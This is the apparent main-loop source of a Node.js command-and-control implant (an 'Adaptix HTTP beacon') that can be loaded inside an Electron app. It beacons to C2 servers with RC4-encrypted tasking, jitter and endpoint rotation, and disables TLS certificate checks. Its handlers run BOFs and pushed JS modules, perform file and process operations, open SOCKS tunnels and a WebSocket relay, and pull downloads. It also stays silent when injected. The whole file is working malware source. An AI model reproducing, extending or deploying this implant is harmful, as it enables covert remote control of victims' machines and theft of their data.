// agent.js — Adaptix HTTP beacon main loop.
// Runnable in plain Node (dev/test) and loadable from an Electron main process
// (see entry.js). Implements: beat registration/tick + task exchange
// (sleep change, terminate, pwd, getuid; generic ack for other no-arg cmds).
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const { load, hostInfo } = require('./config');
const { buildBeat } = require('./beat');
const { rc4 } = require('./rc4');
const { TaskReader, OutPacker, iterateTasks, CP, NO_ARG_COMMANDS } = require('./tasks');
const fsops = require('./fsops');
const bof = require('./bof');
const jsmod = require('./jsmod');
const wslink = require('./wslink');
const socks = require('./socks');
const c2tunnels = require('./tunnel');

// The listener splices RC4(taskStream) raw (not base64!) where the marker sits.
// Like the C++ beacon (ans_pre_size/ans_size), we strip the FIXED template
// prefix/suffix — immune to quote bytes inside the ciphertext.
const TEMPLATE = { pre: '{"status": "ok", "data": "', post: '","metrics": "sync"}' };

function extractPayload(respBody) {
  const text = respBody.toString('latin1');
  const p = text.indexOf(TEMPLATE.pre);
  if (p < 0) return null;
  const from = p + TEMPLATE.pre.length;
  const to = text.length - TEMPLATE.post.length;
  if (to < from) return null;
  return text.slice(from, to); // latin1 round-trip keeps raw bytes 1:1
}

async function request(cfg, headerValue, body = null, ep) {
  const endpoint = ep || cfg.endpoints[0];
  const transport = cfg.ssl ? https : http;
  return new Promise((resolve, reject) => {
    const reqOpts = {
      host: endpoint.host,
      port: endpoint.port,
      path: cfg.uri,
      method: cfg.http_method,
      headers: {
        'User-Agent': cfg.user_agent,
        'Content-Type': 'application/octet-stream',
        'Accept': '*/*',
        [cfg.hb_header]: headerValue,
      },
      ...(cfg.ssl ? { rejectUnauthorized: false } : {}),
      timeout: 15000,
    };
    const req = transport.request(reqOpts, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(new Error('request timeout')); });
    if (body && body.length) req.write(body);
    req.end();
  });
}

function jittered(cfg) {
  // C++ WaitMaskWithEvent (WaitMask.cpp): sleep*1000 minus rand()%(sleep*jitter/100).
  // jitter is a PERCENT that shortens the sleep (integer math, faithful to the beacon).
  const base = cfg.sleep_delay * 1000;
  const minTime = Math.floor((cfg.sleep_delay * cfg.jitter_delay) / 100);
  const dt = minTime ? Math.floor(Math.random() * minTime) : 0;
  return Math.max(0, base - dt);
}

const ts = () => new Date().toISOString().slice(11, 19);
let QUIET = false; // set from cfg.debug in run(); injected payloads stay silent
const log = (m) => { if (!QUIET) console.log(`[${ts()}] ${m}`); };

// ---- task handlers -------------------------------------------------------
// Each returns { reply: fn(out), exit?: bool } or null (skip+log).
function handleTask(commandId, r, cfg, info, state) {
  const out = new OutPacker();

  // GUI-native tunnels (62 START_TCP / 64 WRITE_TCP / 66 CLOSE / 69 PAUSE /
  // 70 RESUME) — dial/pump happens on socket events; reply frames are queued
  // and flushed by the tunnel pump each tick.
  if (state && state.tunnels && state.tunnels.handleTask(commandId, r)) {
    return { reply: null };
  }

  // runtime JS modules (0x1337..0x133a) — pushed over the relay WS channel,
  // never emitted by the stock teamserver (see src/jsmod.js)
  if (jsmod.JS_IDS.has(commandId)) {
    const reply = jsmod.handleTask(commandId, r, state, OutPacker);
    log(`[task] jsmod cmd 0x${commandId.toString(16)} — ${reply ? 'handled' : 'parse error'}`);
    return reply ? { reply } : null;
  }

  // COFF/BOF execution (command 50) + jobs surface (46/47) — native addon
  if (commandId === CP.EXEC_BOF) {
    const reply = bof.handleExecBof(commandId, r, cfg, state, OutPacker);
    log(`[task] EXEC_BOF — ${reply ? 'handled' : 'parse error'}`);
    return reply ? { reply } : null;
  }
  if (commandId === CP.JOB_LIST) {
    const reply = bof.handleJobsList(commandId, r, state, OutPacker);
    log(`[task] JOBS_LIST — ${reply ? 'answered' : 'error'}`);
    return reply ? { reply } : null;
  }
  if (commandId === CP.JOB_KILL) {
    const reply = bof.handleJobsKill(commandId, r, state, OutPacker);
    log(`[task] JOBS_KILL — ${reply ? 'answered' : 'error'}`);
    return reply ? { reply } : null;
  }

  if (commandId === CP.PROFILE) {
    const sub = r.u32();
    if (sub === 1) { // sleep change — THE fix: GUI sleep now applies
      const sleep = r.u32();
      const jitter = r.u32();
      const taskId = r.u32();
      cfg.sleep_delay = sleep;
      cfg.jitter_delay = jitter;
      log(`[task] PROFILE: sleep=${sleep}s jitter=${jitter}s (applied)`);
      out.u32(taskId).u32(CP.PROFILE).u32(1).u32(cfg.sleep_delay).u32(cfg.jitter_delay);
      return { reply: out };
    }
    if (sub === 3) { const taskId = r.u32(); const kill = r.u32(); cfg.kill_date = kill; out.u32(taskId).u32(CP.PROFILE).u32(3).u32(kill); return { reply: out }; }
    if (sub === 4) { const taskId = r.u32(); const wt = r.u32(); cfg.working_time = wt; out.u32(taskId).u32(CP.PROFILE).u32(4).u32(wt); return { reply: out }; }
    return null; // sub 2 (download chunk) / 6: skip
  }

  if (commandId === CP.TERMINATE) {
    const exitMethod = r.u32();
    const taskId = r.u32();
    log(`[task] TERMINATE (method=${exitMethod}) — dying`);
    out.u32(taskId).u32(CP.TERMINATE).u32(exitMethod);
    return { reply: out, exit: true };
  }

  if (commandId === CP.PWD) {
    const taskId = r.u32();
    const cwd = state ? state.cwd : process.cwd(); // tracks CD tasks (C++ keeps a live cwd)
    log(`[task] PWD -> ${cwd}`);
    out.u32(taskId).u32(CP.PWD).str(cwd);
    return { reply: out };
  }

  if (commandId === CP.GETUID) {
    const taskId = r.u32();
    const elevated = !!(typeof process.getuid === 'function' && process.getuid() === 0);
    const domain = info.domain_name || '';
    const username = info.username;
    log(`[task] GETUID -> ${domain}\\${username} elevated=${elevated}`);
    out.u32(taskId).u32(CP.GETUID).u8(elevated ? 1 : 0).str(domain).str(username);
    return { reply: out };
  }

  // file-system / process commands (fsops.js — full Commander.cpp parity)
  const fsReply = fsops.dispatch(commandId, r, cfg, state, OutPacker);
  if (fsReply !== undefined) {
    if (fsReply) { log(`[task] fs/proc cmd ${commandId} handled`); return { reply: fsReply }; }
    return null; // SAVEMEMORY: no reply by design
  }

  if (NO_ARG_COMMANDS.has(commandId)) {
    const taskId = r.u32();
    log(`[task] cmd ${commandId} — not implemented, generic ack`);
    out.u32(taskId).u32(commandId).str('node agent: command not implemented yet');
    return { reply: out };
  }

  log(`[task] cmd ${commandId} — UNKNOWN layout, skipped (stream may desync)`);
  return null;
}

// Persist a generated session key next to the config so a FIXED agent id can
// relaunch with the SAME key — the server reads it at registration only and
// never re-learns it (TsAgentCreate refuses existing ids; TsAgentUpdateData
// only syncs sleep/jitter). Best effort: silently skip on any error.
function persistSessionKey(cfg, key) {
  try {
    if (!cfg.agent_id_explicit || !cfg.__file) return;
    const data = JSON.parse(fs.readFileSync(cfg.__file, 'utf8'));
    // cfg.agent_id is normalized to a number; the file stores the raw string —
    // normalize the file's value the same way before comparing
    if (parseInt(data.agent_id, 16) !== cfg.agent_id) return; // id changed under us
    data.session_key = key.toString('hex');
    fs.writeFileSync(cfg.__file, JSON.stringify(data, null, 2) + '\n');
    log('[*] session key persisted (stable relaunch tasking)');
  } catch (_) { /* best effort */ }
}

// ---- callback endpoint selection (ProfileHTTP servers[] semantics) --------
// sequential: hold one endpoint, advance on transport failure (failover)
// random:     a fresh random endpoint every tick (C++ rotation_mode=1)
let epIndex = 0;
function pickEndpoint(cfg) {
  if (cfg.rotation === 'random') epIndex = Math.floor(Math.random() * cfg.endpoints.length);
  return cfg.endpoints[epIndex % cfg.endpoints.length];
}
function rotateEndpoint(cfg) {
  const from = cfg.endpoints[epIndex % cfg.endpoints.length];
  epIndex = (epIndex + 1) % cfg.endpoints.length;
  const to = cfg.endpoints[epIndex % cfg.endpoints.length];
  log(`[-] endpoint ${from.host}:${from.port} failed — rotating to ${to.host}:${to.port}`);
}

// ---- main loop -----------------------------------------------------------
async function run() {
  const cfg = load();
  QUIET = !cfg.debug;
  const info = hostInfo(cfg);
  // session key: reuse persisted (fixed id) or generate fresh + persist
  let sessionKey;
  if (cfg.session_key) {
    sessionKey = Buffer.from(cfg.session_key, 'hex');
  } else {
    sessionKey = crypto.randomBytes(16);
    persistSessionKey(cfg, sessionKey);
  }
  let beat = buildBeat(cfg, info, sessionKey);
  log(`[*] YADDA  agent_id=${cfg.agent_id.toString(16)}  -> ${cfg.ssl ? 'https' : 'http'}://${cfg.host}:${cfg.port}${cfg.uri}`);
  log(`[*] host: ${info.computer_name} / ${info.os_type} ${info.major_version}.${info.minor_version} / user=${info.username} / proc=${info.process_name}`);

  const maxCycles = process.env.MAX_CYCLES ? parseInt(process.env.MAX_CYCLES, 10) : Infinity;
  let cycles = 0;
  let terminate = false;
  let pendingReply = null; // task outputs built this tick, sent next tick
  const state = fsops.createState();
  state.tunnels = c2tunnels.createTunnels({ log }); // GUI-native SOCKS/portfwd

  // shared task-stream processor: used by BOTH the HTTP tick and the WS push
  // channel — same framing, same handlers, replies go back on their own channel
  function processPayload(dec) {
    const outputs = new OutPacker();
    let handled = 0;
    try {
      for (const t of iterateTasks(dec)) {
        const h = handleTask(t.commandId, t.reader, cfg, info, state);
        if (h) { handled++; if (h.reply) outputs.parts.push(...h.reply.parts); }
        if (h && h.exit) terminate = true;
      }
    } catch (e) {
      log(`[-] task parse error: ${e.message}`);
    }
    // tunnel pump: frames queued by async socket events between ticks
    if (state.tunnels) state.tunnels.pump(outputs);
    // async-BOF pump: streamed frames from native threads (milestone 12)
    bof.pump(outputs, log);
    return { outputs, handled };
  }

  // ---- interactive session channel (persistent WebSocket, push-style) -----
  // Runs ALONGSIDE the HTTP beacon: tasking stays on the C2, the WS link adds
  // a realtime channel for the relay (console + SOCKS5 pivoting).
  let link = null;
  let tunnels = null;
  if (cfg.ws) {
    link = wslink.createLink({ ...cfg.ws, agent_id: cfg.agent_id }, { log });
    tunnels = socks.createTunnels((c, code, d) => link.sendTunnel(c, code, d), {
      log,
      backlog: () => link.buffered(),
    });
    link.start({
      onTask: (dec) => {
        const { outputs, handled } = processPayload(dec);
        if (outputs.parts.length) link.sendTask(outputs.build()); // push, no tick wait
        if (handled) log(`[+] ws: processed ${handled} task(s) — reply pushed`);
      },
      onTunnel: (code, connId, data) => tunnels.handleFrame(code, connId, data),
      onState: (isUp) => { if (!isUp && tunnels) tunnels.closeAll(); },
    });
    log(`[*] interactive channel: ${cfg.ws.url}`);
  }


  for (;;) {
    let body = pendingReply || Buffer.alloc(0);
    pendingReply = null;
    try {
      // beat is rebuilt every tick like the C++ beacon (carries current sleep/jitter);
      // session key stays fixed — the server keeps the one from registration
      beat = buildBeat(cfg, hostInfo(cfg), sessionKey);
      const ep = pickEndpoint(cfg);
      const res = await request(cfg, beat.headerValue, body.length ? body : null, ep);

      if (res.status !== 200) {
        log(`[-] non-200 status ${res.status}`);
      } else {
        const payload = extractPayload(res.body);
        if (payload && payload.length > 0) {
          // raw RC4 bytes -> session key
          const enc = Buffer.from(payload, 'latin1');
          let dec;
          try { dec = rc4(enc, sessionKey); }
          catch (e) { log(`[-] rc4 failed: ${e.message}`); dec = null; }

          if (dec && dec.length > 4) {
            const { outputs, handled } = processPayload(dec);
            // download chunk pump runs every tick with tasks (Downloader.cpp: ProcessDownloader)
            fsops.processDownloads(state, outputs, cfg);
            if (handled > 0 || outputs.parts.length) {
              pendingReply = rc4(outputs.build(), sessionKey); // NEXT tick carries results
              log(`[+] processed ${handled} task(s) — reply queued (${pendingReply.length}B)`);
            }
          } else {
            // no tasks — but RUNNING downloads + tunnel sockets + async BOFs still pump
            const outputs = new OutPacker();
            fsops.processDownloads(state, outputs, cfg);
            if (state.tunnels) state.tunnels.pump(outputs);
            bof.pump(outputs, log);
            if (outputs.parts.length) {
              pendingReply = rc4(outputs.build(), sessionKey);
              log(`[+] pump — ${pendingReply.length}B queued (downloads/tunnels)`);
            } else {
              log('[+] tick (empty payload)');
            }
          }
        } else {
          log('[+] tick (no tasks)');
        }
      }
    } catch (err) {
      if (cfg.endpoints.length > 1) rotateEndpoint(cfg);
      log(`[-] callback error: ${err.message}`);
    }

    cycles++;
    if (cycles >= maxCycles) { log('[=] reached MAX_CYCLES — exiting'); break; }
    if (terminate) { log('[=] TERMINATE task — exiting'); break; }

    const ms = jittered(cfg);
    await new Promise((r) => setTimeout(r, ms));
  }

  if (link) link.stop();
  if (state.tunnels) state.tunnels.closeAll();
}

if (require.main === module) {
  run().catch((e) => { console.error('fatal', e); process.exit(1); });
}

module.exports = { run, extractPayload, handleTask };
